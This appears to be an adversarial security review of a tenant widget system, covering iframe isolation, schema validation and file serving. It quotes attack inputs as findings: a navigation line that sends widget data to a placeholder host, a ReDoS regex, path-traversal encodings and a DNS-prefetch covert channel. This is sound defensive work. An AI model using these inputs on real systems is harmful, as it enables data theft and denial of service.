# p34-b4r: an adversarial review of tenant widgets

Reviewed from the code first (host, channel, schema check, serving route, build, data and events), then attacked. Browser checks used a throwaway Chromium (Playwright) against a local server that served a frame with `WIDGET_POLICY` inside a host page.

## Holes found and fixed

1. **A frame could carry what it was given to another site (high).** `location.href = "https://x/?" + JSON.stringify(props)`, and `<meta http-equiv=refresh>`, are not stopped by the frame's own CSP (no `navigate-to` in browsers) or by the sandbox flags. In Chromium, with a host page that has no CSP (the console), both sent the request (`/nav?d=secret`, `/meta?d=secret`). A served app's `default-src 'self'` already blocked it. Fix: every HTML page of the console carries `frame-src 'self' <main origin> <apps origin>` (`apps/control-plane/src/app.ts`, an `onSend` hook). Seen failing first: `console-files.test.ts` "p34-b4r the console's page lets a frame be only the instance's own". Re-run in the browser with `frame-src 'self'`: nav, meta, prefetch, preconnect, ping all send nothing.
2. **ReDoS in the payload check (high for the viewer's tab).** A tenant's schema `pattern: "^(a+)+$"` and a frame sending `"aaaa...!"` hung the host page's thread (the test run did not finish in 120 s). Fix, `packages/widget-sdk/src/schema.ts` `patternProblem`: a pattern is not run if it repeats a group, has a back reference or look-around, has more than two unbounded repeats, or is over 200 characters; a string over 256 characters is refused before any pattern runs. Tests: `schema.test.ts`.
3. **Inherited names (low).** `required: ["constructor"]` was satisfied by `{}` (`in` reads the prototype), and `properties` was read with `in`. Now `Object.hasOwn` (`schema.ts`). Test in `schema.test.ts`.
4. **Content type came from the bundle (defence in depth).** The server took a widget file's `contentType` from the bundle's listing, which a hand-made bundle sets freely (`image/svg+xml` for the frame page). It is now said by the file name (`.html`, `.js`, else text/plain) in `serveWidgetFile`, `front.ts`. Test failing first: `widgets.test.ts` "what a file is served as is said by its name".
5. **No policy on refusals under `/_widgets/` (low).** 404, 405, 429 and the 307 to the apps address had none. They now carry `WIDGET_POLICY` (`front.ts`, set at the start of the branch). Test failing first: "no address under /_widgets is answered without the policy".

## Attacks that failed (no change)

- Host: a message is believed only when `event.source` is the frame's own `contentWindow`; a second frame's message reaches only its own host; `sandbox` is the literal `allow-scripts`, never built from data; `allow-same-origin` is not reachable. New `TenantWidgetHost.test.tsx` fails when the source check is removed. Channel uses `Object.hasOwn` for event names; size and rate limits and a JSON copy of the payload apply.
- Schema: `$ref`, `not`, `if`, `patternProperties` and other keywords fail closed; a tuple `items` fails closed; depth is capped at 32 for the schema; deep values stop at `JSON.stringify` (caught, dropped); `__proto__` in JSON is an own key, caught by `additionalProperties: false`.
- Serving: `..`, `%2e%2e`, `%2f`, double-encoded, NUL, trailing slash, double slash, upper-case names, other tenant's slug, a version not deployed, another type: all 404 (`%FF`: 400 text). `%2e%2e` segments that resolve before routing are plain paths of the same route, not an escape. No `Set-Cookie`, no cookie read, `nosniff`. A tenant's custom domain serves only that tenant's widgets.
- Opaque origin: with no apps address the files are at the console address. Opened as a top-level page in Chromium the frame page has `document.cookie` and `localStorage` throwing `SecurityError` while a cookie was set for that address. Inside the sandboxed iframe the same.
- Build: the CLI refuses `https://` imports and `import()`; a hand-made bundle is not checked in content, but CSP (`script-src 'self'`, `default-src 'none'`) stops inline script, `eval` and remote loads, and the server accepts exactly `frame.html` and one `view-<8 hex>.js`.
- Data: a widget's inputs are resolved by the server from the stored page for the viewer under each table's row policy (`/widget-data`); the frame has no network and sends no query; config is page data, not a query.

## Left, for the owner

- **Events carry no user gesture.** A frame can raise any event it declares, at any time, without a click. If the page author attached an action to it (`widget.on[event]`), that action runs as the viewer, with a record id the frame chose (`PageView.tsx` `emit`). The server still checks the viewer's permission for the action and the record, and confirmations still ask, but a widget placed on a page with a destructive `on/rowClick` can fire it unprompted. Options: refuse actions on tenant widgets' events unless the action asks to confirm; or require the page author to mark the event as allowed to act.
- DNS prefetch (`<link rel=dns-prefetch>`) is a known covert channel that CSP does not govern; the experiment's prefetch and preconnect sent nothing to the local server, but a DNS-only leak was not measurable there.
- Pages of tenants' own custom hostnames embedding widgets use the app's own `default-src 'self'`; the portal pages use `default-src 'none'`: no frames there.
- `TenantWidgetHost.test.tsx` prints happy-dom's "Iframe page loading is disabled" to stderr; the tests pass.
- A full-stack browser walk of the console with a hostile widget was not run; the existing `e2e/widget-frame.spec.ts` was not re-run (no navigation attempt is in it: worth adding `location.href` to its hostile view).
